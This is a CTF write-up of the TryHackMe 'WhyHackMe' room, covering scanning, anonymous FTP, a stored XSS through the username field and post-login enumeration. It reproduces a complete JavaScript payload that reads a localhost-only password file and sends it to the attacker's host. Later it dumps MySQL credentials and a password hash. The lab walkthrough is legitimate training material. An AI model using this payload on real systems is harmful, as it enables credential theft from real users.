---
title: "TryHackMe: WhyHackMe"
author: cilgin
date: 2025-07-10 13:56:25 +0300
categories: [CyberSecurity]
tags: [CTF, TryHackMe, Medium]
pin: false
math: false
mermaid: false
image:
  path: /assets/img/2025-07-10-TryHackMe-WhyHackMe/main.webp
---

Hi I'm making [TryHackMe WhyHackMe](https://tryhackme.com/room/whyhackme) room.

---

```bash
IP=10.10.157.184
```

```bash
❯ nmap -T4 -n -sC -sV -Pn -p- $IP
Starting Nmap 7.97 ( https://nmap.org ) at 2025-07-10 14:00 +0300
Nmap scan report for 10.10.157.184
Host is up (0.070s latency).
Not shown: 65531 closed tcp ports (conn-refused)
PORT      STATE    SERVICE VERSION
21/tcp    open     ftp     vsftpd 3.0.3
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to 10.21.206.128
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             318 Mar 14  2023 update.txt
22/tcp    open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 47:71:2b:90:7d:89:b8:e9:b4:6a:76:c1:50:49:43:cf (RSA)
|   256 cb:29:97:dc:fd:85:d9:ea:f8:84:98:0b:66:10:5e:6f (ECDSA)
|_  256 12:3f:38:92:a7:ba:7f:da:a7:18:4f:0d:ff:56:c1:1f (ED25519)
80/tcp    open     http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Welcome!!
|_http-server-header: Apache/2.4.41 (Ubuntu)
41312/tcp filtered unknown
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 65.77 seconds
```

Lets firstly go to the website.

![Desktop View](/assets/img/2025-07-10-TryHackMe-WhyHackMe/photo1.webp){: width="972" height="589" }

Looks like very simple php website.

Looking throught website I found some login endpotint `/login.php`

![Desktop View](/assets/img/2025-07-10-TryHackMe-WhyHackMe/photo2.webp){: width="972" height="589" }

admin admin didn't worked lets firstly fuzz the website using `gobuster`.

```bash
❯ gobuster dir -w common.txt -u http://$IP/ -x md,js,html,php,py,css,txt,bak -t 50
===============================================================
Gobuster v3.7
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.157.184/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.7
[+] Extensions:              py,css,txt,bak,md,js,html,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/assets               (Status: 301) [Size: 313] [--> http://10.10.157.184/assets/]
/blog.php             (Status: 200) [Size: 3102]
/cgi-bin/             (Status: 403) [Size: 277]
/config.php           (Status: 200) [Size: 0]
/dir                  (Status: 403) [Size: 277]
/index.php            (Status: 200) [Size: 563]
/login.php            (Status: 200) [Size: 523]
/logout.php           (Status: 302) [Size: 0] [--> login.php]
/register.php         (Status: 200) [Size: 643]
/server-status        (Status: 403) [Size: 277]
Progress: 42651 / 42651 (100.00%)
===============================================================
Finished
===============================================================
```

And I found register.php so lets register a account first and try to log in.

![Desktop View](/assets/img/2025-07-10-TryHackMe-WhyHackMe/photo3.webp){: width="972" height="589" }

I logged in but thats it i think.

It says that now we can comment on posts.

Maybe we can try to exploit that.

Firstly lets log in Anonymous on ftp.

```bash
root@e3769c930fc5:/data# ftp 10.10.157.184 21
Connected to 10.10.157.184.
220 (vsFTPd 3.0.3)
Name (10.10.157.184:root): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||53253|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             318 Mar 14  2023 update.txt
226 Directory send OK.
ftp> ls -la
229 Entering Extended Passive Mode (|||5144|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        119          4096 Mar 14  2023 .
drwxr-xr-x    2 0        119          4096 Mar 14  2023 ..
-rw-r--r--    1 0        0             318 Mar 14  2023 update.txt
226 Directory send OK.
```

Lets download update.txt

```bash
ftp> get update.txt
```

```bash
❯ cat update.txt
Hey I just removed the old user mike because that account was compromised and for any of you who wants the creds of new account visit 127.0.0.1/dir/pass.txt and don't worry this file is only accessible by localhost(127.0.0.1), so nobody else can view it except me or people with access to the common account.
- admin
```

Now lets continue trying to xss vuln.

![Desktop View](/assets/img/2025-07-10-TryHackMe-WhyHackMe/photo4.webp){: width="972" height="589" }

It looks like this is not working lets try creating a user named xss vuln.

And It works.

![Desktop View](/assets/img/2025-07-10-TryHackMe-WhyHackMe/photo5.webp){: width="972" height="589" }

Now lets use this vuln to get the /dir/pass.txt

Now firstly open a username named

`<script src="http://10.21.206.128/pwn.js"></script>`

Here is the code I used:

[TrustedSec | Simple Data Exfiltration Through XSS](https://trustedsec.com/blog/simple-data-exfiltration-through-xss)

```javascript
// TrustedSec Proof-of-Concept to steal
// sensitive data through XSS payload
function read_body(xhr) {
  var data;
  if (!xhr.responseType || xhr.responseType === "text") {
    data = xhr.responseText;
  } else if (xhr.responseType === "document") {
    data = xhr.responseXML;
  } else if (xhr.responseType === "json") {
    data = xhr.responseJSON;
  } else {
    data = xhr.response;
  }
  return data;
}

function stealData() {
  var uri = "/dir/pass.txt";

  xhr = new XMLHttpRequest();
  xhr.open("GET", uri, true);
  xhr.send(null);

  xhr.onreadystatechange = function () {
    if (xhr.readyState == XMLHttpRequest.DONE) {
      // We have the response back with the data
      var dataResponse = read_body(xhr);

      // Time to exfiltrate the HTML response with the data
      var exfilChunkSize = 2000;
      var exfilData = btoa(dataResponse);
      var numFullChunks = (exfilData.length / exfilChunkSize) | 0;
      var remainderBits = exfilData.length % exfilChunkSize;

      // Exfil the yummies
      for (i = 0; i < numFullChunks; i++) {
        console.log("Loop is: " + i);

        var exfilChunk = exfilData.slice(
          exfilChunkSize * i,
          exfilChunkSize * (i + 1)
        );

        // Let's use an external image load to get our data out
        // The file name we request will be the data we're exfiltrating
        var downloadImage = new Image();
        downloadImage.onload = function () {
          image.src = this.src;
        };

        // Try to async load the image, whose name is the string of data
        downloadImage.src =
          "http://10.21.206.128/exfil/" + i + "/" + exfilChunk + ".jpg";
      }

      // Now grab that last bit
      var exfilChunk = exfilData.slice(
        exfilChunkSize * numFullChunks,
        exfilChunkSize * numFullChunks + remainderBits
      );
      var downloadImage = new Image();
      downloadImage.onload = function () {
        image.src = this.src;
      };

      downloadImage.src =
        "http://10.21.206.128/exfil/" + "LAST" + "/" + exfilChunk + ".jpg";
      console.log("Done exfiling chunks..");
    }
  };
}

stealData();
```

Now serve this code using a webserver.

```bash
❯ sudo python -m http.server 80
```
And you'll get the password base64 encoded after sending a new comment.


```text
10.10.157.184 - - [10/Jul/2025 15:30:03] "GET /pwn.js HTTP/1.1" 200 -
10.10.157.184 - - [10/Jul/2025 15:30:03] code 404, message File not found
10.10.157.184 - - [10/Jul/2025 15:30:03] "GET /exfil/LAST/**************GFzc3dvcmRTb1N0cm9uZ0lESwo=.jpg HTTP/1.1" 404 -
```

decode the base64 and you'll get the jacks password

use that password to log in with ssh as jack.
```bash
❯ ssh jack@$IP                 
The authenticity of host '10.10.157.184 (10.10.157.184)' can't be established.
ED25519 key fingerprint is SHA256:4vHbB54RGaVtO3RXlzRq50QWtP3O7aQcnFQiVMyKot0.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.157.184' (ED25519) to the list of known hosts.
jack@10.10.157.184's password: 
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-159-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu 10 Jul 2025 12:33:12 PM UTC

  System load:  0.0                Processes:             130
  Usage of /:   79.7% of 11.21GB   Users logged in:       0
  Memory usage: 32%                IPv4 address for eth0: 10.10.157.184
  Swap usage:   0%

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

64 updates can be applied immediately.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Mon Jan 29 13:44:19 2024
jack@ubuntu:~$ 
```


```bash
jack@ubuntu:~$ ls
user.txt
jack@ubuntu:~$ cat user.txt 
*******************************
```

```bash
jack@ubuntu:/home$ service --status-all
 [ - ]  apache-htcacheclean
 [ + ]  apache2
 [ + ]  apparmor
 [ + ]  apport
 [ + ]  atd
 [ - ]  console-setup.sh
 [ + ]  cron
 [ - ]  cryptdisks
 [ - ]  cryptdisks-early
 [ + ]  dbus
 [ - ]  grub-common
 [ - ]  hwclock.sh
 [ - ]  irqbalance
 [ - ]  iscsid
 [ - ]  keyboard-setup.sh
 [ + ]  kmod
 [ - ]  lvm2
 [ - ]  lvm2-lvmpolld
 [ + ]  multipath-tools
 [ + ]  mysql
 [ + ]  netfilter-persistent
 [ - ]  open-iscsi
 [ - ]  open-vm-tools
 [ - ]  plymouth
 [ - ]  plymouth-log
 [ + ]  procps
 [ - ]  rsync
 [ + ]  rsyslog
 [ - ]  screen-cleanup
 [ + ]  ssh
 [ + ]  udev
 [ + ]  ufw
 [ + ]  unattended-upgrades
 [ - ]  uuidd
 [ + ]  vsftpd
 [ - ]  x11-common
```

lets log in mysql service.


runnning linpeas I found this.


```text
/var/www/html/config.php:$password = "MysqlPasswordIsPrettyStrong";
```


```bash
jack@ubuntu:/home$ mysql -u root -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 62
Server version: 10.3.38-MariaDB-0ubuntu0.20.04.1 Ubuntu 20.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> 
```

And I'm in


```bash
MariaDB [mysql]> select * from user;
+-----------+------+-------------------------------------------+-------------+-------------+-------------+-------------+-------------+-----------+-------------+---------------+--------------+-----------+------------+-----------------+------------+------------+--------------+------------+-----------------------+------------------+--------------+-----------------+------------------+------------------+----------------+---------------------+--------------------+------------------+------------+--------------+------------------------+---------------------+----------+------------+-------------+--------------+---------------+-------------+-----------------+----------------------+--------+-----------------------+------------------+---------+--------------+--------------------+
| Host      | User | Password                                  | Select_priv | Insert_priv | Update_priv | Delete_priv | Create_priv | Drop_priv | Reload_priv | Shutdown_priv | Process_priv | File_priv | Grant_priv | References_priv | Index_priv | Alter_priv | Show_db_priv | Super_priv | Create_tmp_table_priv | Lock_tables_priv | Execute_priv | Repl_slave_priv | Repl_client_priv | Create_view_priv | Show_view_priv | Create_routine_priv | Alter_routine_priv | Create_user_priv | Event_priv | Trigger_priv | Create_tablespace_priv | Delete_history_priv | ssl_type | ssl_cipher | x509_issuer | x509_subject | max_questions | max_updates | max_connections | max_user_connections | plugin | authentication_string | password_expired | is_role | default_role | max_statement_time |
+-----------+------+-------------------------------------------+-------------+-------------+-------------+-------------+-------------+-----------+-------------+---------------+--------------+-----------+------------+-----------------+------------+------------+--------------+------------+-----------------------+------------------+--------------+-----------------+------------------+------------------+----------------+---------------------+--------------------+------------------+------------+--------------+------------------------+---------------------+----------+------------+-------------+--------------+---------------+-------------+-----------------+----------------------+--------+-----------------------+------------------+---------+--------------+--------------------+
| localhost | root | *3D577F2475F02A47015A065BFEAC3749075F5ACC | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | Y          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                | Y                | Y              | Y                   | Y                  | Y                | Y          | Y            | Y                      | Y                   |          |            |             |              |             0 |           0 |               0 |                    0 |        |                       | N                | N       |              |           0.000000 |
+-----------+------+-------------------------------------------+-------------+-------------+-------------+-------------+-------------+-----------+-------------+---------------+--------------+-----------+------------+-----------------+------------+------------+--------------+------------+-----------------------+------------------+--------------+-----------------+------------------+------------------+----------------+---------------------+--------------------+------------------+------------+--------------+------------------------+---------------------+----------+------------+-------------+--------------+---------------+-------------+-----------------+----------------------+--------+-----------------------+------------------+---------+--------------+--------------------+
```

I found this.
